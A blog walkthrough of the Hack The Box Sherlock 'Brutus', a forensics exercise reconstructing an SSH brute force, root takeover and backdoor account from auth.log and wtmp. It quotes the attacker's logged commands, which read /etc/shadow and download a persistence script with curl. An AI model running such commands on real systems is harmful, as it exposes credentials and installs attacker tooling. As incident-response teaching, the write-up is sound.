---
title: "HTB Sherlock: Brutus"
author: baraka
date: 2026-10-28 15:30:00 +0300
description: A Hack The Box Sherlock walkthrough. Eight questions about a brute-forced SSH server, answered from auth.log and wtmp by building one timeline of the attack, from the first guess to a downloaded script.
image:
  path: /assets/images/Eighteenth_blog/banner.png
  alt: The Hack The Box Sherlock card for Brutus, rated Very Easy, with 195 XP.
categories: [ Security, HTB Sherlocks ]
tags: [ HTB, Sherlocks, Brutus, Linux Forensics, auth.log, wtmp, SSH, Brute Force, MITRE ATT&CK, DFIR ]
---

## Overview

**Brutus** is a *Very Easy* Sherlock on Hack The Box. In this case a Confluence server was attacked over SSH, and the files left behind are logs, not a network capture. The download is `Brutus.zip` (password `hacktheblue`) and contains:

| File | What it is |
|---|---|
| `auth.log` | The Linux authentication log: SSH logins, `sudo`, account changes and cron. 385 lines. |
| `wtmp` | A binary record of every login session on the machine. It needs a parser to read. |
| `utmp.py` | The parser that HTB provides for `wtmp`. |

The host is `ip-172-31-35-28`, an AWS instance. Its cron entries run as a `confluence` user, which is why the case describes a Confluence server.

There are eight questions. They all come down to one job: reconstruct what the attacker did, in order, using two logs that record the same events in different ways.

---

## Setup

The zip uses AES encryption, so the usual `unzip` skips the files with `unsupported compression method 99`. `bsdtar` handles it:

```bash
mkdir Brutus_extracted && cd Brutus_extracted
bsdtar --passphrase hacktheblue -xf ../Brutus.zip
sha256sum auth.log wtmp utmp.py
```

| File | SHA256 |
|---|---|
| `auth.log` | `66bdba9ff1688766876deadc19ab5ddb2b0bce6a638bf255586a863260f58b9e` |
| `wtmp` | `dddc32ea65ed9972b0ee9802f95b20d4b6b98c0d5b4930f6d2302f2740458576` |
| `utmp.py` | `561f0d4e696f939d6f1ae72e7b072597811612fa1a63302ace3d17d5ca3004ce` |

> Open evidence files in a plain text viewer or the terminal, and never in an office program. I started by opening `auth.log` just to see what was inside. The file is small, so a plain text editor such as Notepad shows it well. In LibreOffice, though, the save reflowed the log from 385 lines into 2 and added backslashes to every bracket. I restored it from the zip and checked the hash above.
{: .prompt-warning }

---

## The approach

Logs are small enough to read, but a repeated pattern hides in the middle of them. I used the same short method as in the last Sherlock:

1. **Orient**: count what the log is made of and where it comes from.
2. **Triage**: find the one source that behaves differently from the rest.
3. **Pivot**: follow that source through every file that mentions it.
4. **Verify**: check each answer against a second source before accepting it.

The log is dominated by cron noise. Of the 385 lines, 104 are `CRON` and 257 are `sshd`. The `sshd` lines are where the incident is.

---

## Task 1: The brute-force IP

> Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

A brute force leaves many failed logins from one source. So I filtered for failures and counted them by source address:

```bash
grep 'Failed password' auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c
```

![Desktop View](/assets/images/Eighteenth_blog/task1-failed-by-ip.png)
_All 48 failed passwords come from a single address_

`sort` goes before `uniq -c` because `uniq` only collapses lines that sit next to each other.

The 48 failures come from one address, and no other address has a single failure. Two more details make this look automated:

* **The speed.** All 48 failures fall between 06:31:33 and 06:31:42, a window of 9 seconds, which is faster than a person types.
* **The accounts.** The failures spread across five usernames, so the tool was guessing at account names too:

| Username | Failed attempts | Exists on the server? |
|---|---|---|
| `server_adm` | 12 | no |
| `svc_account` | 11 | no |
| `admin` | 10 | no |
| `backup` | 9 | yes |
| `root` | 6 | yes |

`sshd` also logged `beginning MaxStartups throttling` at 06:31:31 and later `21 connections dropped`. That means the attacker opened SSH connections faster than the server would accept them.

**Answer:** `65.2.161.68`

---

## Task 2: The compromised account

> The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

Failures show the attempt, and the successes show the result. Every success is logged as `Accepted`:

```bash
grep 'Accepted' auth.log
grep 'Accepted' auth.log | grep 65.2.161.68
```

![Desktop View](/assets/images/Eighteenth_blog/task2-accepted-logins.png)
_All successful logins, then only the ones from the attacker's address_

| Time | User | Source address |
|---|---|---|
| 06:19:54 | `root` | `203.101.190.9` |
| 06:31:40 | `root` | `65.2.161.68` |
| 06:32:44 | `root` | `65.2.161.68` |
| 06:37:34 | `cyberjunkie` | `65.2.161.68` |

The attacker got in as **`root`**, and `root` was one of the accounts the brute force targeted. `cyberjunkie` was not on the list of guessed accounts, because the attacker created it themselves (Task 5).

The first line is a login from a different address. I do not count it as the attacker's:

* it has no failed attempts before it
* it happened 12 minutes before the attack began
* `wtmp` shows the same address logging in as `root` on 2024-01-25 and 2024-02-11, so it has a history of legitimate-looking logins to this host

That is evidence against it being the attacker, though the logs cannot prove who it was.

**Answer:** `root`

---

## Task 3: The manual login time

> Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

The two logs record different events:

* `auth.log` records **authentication**: the moment the password was accepted.
* `wtmp` records a **session**: the moment a terminal was opened.

`wtmp` is binary, so I used the parser that came with the case. It prints times in the **local** timezone of the machine running it, and mine is UTC+3, so I set `TZ=UTC` for the command:

```bash
TZ=UTC python3 -I utmp.py wtmp
```

(`-I` stops Python from importing code from the current directory, which holds files from a downloaded archive.)

![Desktop View](/assets/images/Eighteenth_blog/task3-wtmp-login.png)
_The `wtmp` rows for the incident, with the manual root session circled_

Only one root login from `65.2.161.68` appears in `wtmp`:

```
USER  2549  pts/1  root         65.2.161.68  2024/03/06 06:32:45
DEAD  2491  pts/1                            2024/03/06 06:37:24
USER  2667  pts/1  cyberjunkie  65.2.161.68  2024/03/06 06:37:35
```

`auth.log` has two root logins from this address, at 06:31:40 and 06:32:44, so the 06:31:40 login never got a terminal. That fits the hint, which describes the first login as an automated brute-force success that closed within the same second. The second login is the person at the keyboard. It appears in `wtmp` one second after `auth.log` because the terminal opens just after authentication.

I also read the raw value from the binary to check the parser. The record holds the epoch `1709706765`, which is `2024-03-06 06:32:45 UTC`.

**Answer:** `2024-03-06 06:32:45`

> The parser prints the date with slashes (`2024/03/06`), and my first attempt in that format was rejected. HTB accepted the ISO form with dashes, as shown above.
{: .prompt-tip }

---

## Task 4: The session number

> SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

`systemd-logind` numbers every login. The log line is `New session`:

```bash
grep 'New session' auth.log
```

![Desktop View](/assets/images/Eighteenth_blog/task4-new-session.png)
_`systemd-logind` assigns session 37 to the 06:32:44 root login_

| Time | User | Session |
|---|---|---|
| 06:19:54 | root, other address | 6 |
| 06:31:40 | root, automated login | 34 |
| 06:32:44 | root, manual login | **37** |
| 06:37:34 | cyberjunkie | 49 |

`root` has three sessions, so the username alone does not answer the question. The timestamp does: 06:32:44 is the manual login found in Task 3, and `wtmp` links to it through the sshd PID, 2491 (`sshd[2491]` in `auth.log`, the `DEAD` record in `wtmp`).

**Answer:** `37`

---

## Task 5: The persistence account

> The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Account changes are logged by the tools that make them: `useradd`, `usermod` and `groupadd`.

```bash
grep -E 'useradd|usermod|groupadd' auth.log
grep -E 'useradd' auth.log
```

![Desktop View](/assets/images/Eighteenth_blog/task5-new-user.png)
_Account creation and the `sudo` group change_

```
06:34:18  groupadd  new group: name=cyberjunkie, GID=1002
06:34:18  useradd   new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
06:35:15  usermod   add 'cyberjunkie' to group 'sudo'
```

Three details matter here:

* **`from=/dev/pts/1`** shows the account was created from the same terminal that `wtmp` recorded for the manual root session (Task 3).
* **The `sudo` group** is the privilege escalation in the question. A member of that group can run any command as root.
* **The surrounding lines** show a `passwd` change at 06:34:26 and a `chfn` at 06:34:31, so the account was given a password and profile details within a minute of being created.

**Answer:** `cyberjunkie`

---

## Task 6: The MITRE ATT&CK technique

> What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

This is a lookup, and I checked it against what the log shows. The attacker created a user on the machine itself, which is a **local** account, not a domain or cloud one. That is **Create Account: Local Account**.

**Answer:** `T1136.001`

For the whole case, my own mapping is below. HTB only asks for the first row, and the others are my reading of the log:

| Stage | Evidence | Technique |
|---|---|---|
| Guessing passwords | 48 failures in 9 seconds | T1110 Brute Force |
| Remote access | SSH as `root` | T1021.004 Remote Services: SSH |
| Persistence | `useradd cyberjunkie` | **T1136.001** Create Account: Local Account |
| Privilege | `usermod ... sudo` | T1098 Account Manipulation |
| Credential access | `sudo cat /etc/shadow` | T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow |
| Tool download | `sudo curl ...` | T1105 Ingress Tool Transfer |

The log does not record which passwords were tried, so I stop at T1110 and do not pick between its sub-techniques.

---

## Task 7: When the session ended

> What time did the attacker's first SSH session end according to auth.log?

Sessions end with a `Removed session` line from `systemd-logind`, and the matching `session closed` line from `sshd`:

```bash
grep -E 'Removed session|session closed for user root' auth.log
```

![Desktop View](/assets/images/Eighteenth_blog/task7-session-end.png)
_Session 37 closes at 06:37:24_

```
06:37:24  sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
06:37:24  systemd-logind: Session 37 logged out.
06:37:24  systemd-logind: Removed session 37.
```

The session lasted from 06:32:44 to 06:37:24, which is 4 minutes and 40 seconds. The attacker closed it themselves (`disconnected by user`), and `wtmp` agrees with a `DEAD` record at the same second. Ten seconds later they logged back in as `cyberjunkie`, the account created in that window.

The wording of the question is ambiguous. Session 34 was technically the attacker's first, and it ended at 06:31:40, the same second it opened. I read "first SSH session" as the terminal session that this case follows from Task 3 onward, and HTB accepted that reading.

**Answer:** `2024-03-06 06:37:24`

---

## Task 8: The command run with sudo

> The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

`sudo` logs the full command line for every use:

```bash
grep 'COMMAND' auth.log
```

![Desktop View](/assets/images/Eighteenth_blog/task8-sudo-commands.png)
_Both sudo commands run by `cyberjunkie`_

```
06:37:57  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
06:39:38  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

There are two commands. The first reads `/etc/shadow`, the file of password hashes, which only root can read. The second downloads a script from a public GitHub repository, and it is the one the question asks for.

`auth.log` records that the script was **downloaded**. It does not show the script being run or saved, so I do not claim either. I also did not fetch the script. From its name and repository I would expect a persistence tool, but I treat that as a guess, not a finding.

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

---

## Timeline

All times are UTC on 2024-03-06.

| Time | Event | Source |
|---|---|---|
| 06:17:15 | Server boots | `wtmp` |
| 06:19:54 | Root login from `203.101.190.9`, session 6 | `auth.log` |
| 06:31:31 | SSH starts throttling connections from `65.2.161.68` | `auth.log` |
| 06:31:33 to 06:31:42 | 48 failed passwords across 5 usernames | `auth.log` |
| 06:31:40 | Root password guessed, session 34 opens and closes in the same second | `auth.log` |
| 06:32:44 | Manual root login, session 37 | `auth.log` |
| 06:32:45 | Terminal `pts/1` opened | `wtmp` |
| 06:34:18 | User `cyberjunkie` created | `auth.log` |
| 06:35:15 | `cyberjunkie` added to the `sudo` group | `auth.log` |
| 06:37:24 | Session 37 ends | `auth.log`, `wtmp` |
| 06:37:34 | `cyberjunkie` logs in, session 49 | `auth.log` |
| 06:37:57 | `sudo cat /etc/shadow` | `auth.log` |
| 06:39:38 | `sudo curl` downloads `linper.sh` | `auth.log` |

---

## Answers at a glance

| # | Question | Answer |
|---|---|---|
| 1 | Brute-force IP | `65.2.161.68` |
| 2 | Compromised account | `root` |
| 3 | Manual login time | `2024-03-06 06:32:45` |
| 4 | Session number | `37` |
| 5 | Persistence account | `cyberjunkie` |
| 6 | MITRE sub-technique | `T1136.001` |
| 7 | First session end | `2024-03-06 06:37:24` |
| 8 | Sudo command | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---

## Sherlock solved

```console
$ ./sherlock --verify Brutus
[+] task 1/8 ... ok
[+] task 2/8 ... ok
[+] task 3/8 ... ok
[+] task 4/8 ... ok
[+] task 5/8 ... ok
[+] task 6/8 ... ok
[+] task 7/8 ... ok
[+] task 8/8 ... ok
[+] exit code 0, +195 XP
```

![Desktop View](/assets/images/Eighteenth_blog/solved.png)
_Brutus solved on 28 Oct 2026, Sherlock rank #41082_

A few nerdy numbers from the case:

* **48 guesses in 9 seconds** is about 5 per second. A person would need minutes to type that many.
* **10 seconds** passed between the attacker logging out as root and logging back in as `cyberjunkie`, and the account had been created 3 minutes earlier. The attacker clearly knew what to do next.
* **The first success was wasted.** The tool found the root password at 06:31:40, and the session closed in the same second. The attacker then came back by hand 64 seconds later.
* **Total time on the box:** from the first guess at 06:31:33 to the script download at 06:39:38 is 8 minutes and 5 seconds.

---

## What I learned

* **Two logs beat one.** `auth.log` says when a password worked, and `wtmp` says when someone sat down. The gap between them separates the tool from the person.
* **A PID is a join key.** The sshd process ID appeared in both `auth.log` and `wtmp`, which tied the two records to the same session.
* **Match on more than the username.** `root` had three sessions, and only the timestamp identified the attacker's.
* **Check the timezone before the answer.** The parser prints local time, and a UTC question needs `TZ=UTC`.
* **State what the log does not show.** The download is logged and the execution is not, and the writeup should say so.

## Limits of this analysis

* `auth.log` does not record which passwords were tried, so the brute-force sub-technique is not identified.
* The log does not show whether `linper.sh` was run, or what it changed.
* The address `203.101.190.9` is not attributed to anyone. I excluded it from the attack based on timing and history, and the logs cannot confirm who used it.
* Only the files in the download were analysed, so nothing here comes from the server itself.

## Tools used

* `bsdtar`, `sha256sum` for extraction and integrity
* `grep`, `awk`, `sort`, `uniq` for the log analysis
* `utmp.py` for `wtmp`, with `TZ=UTC`
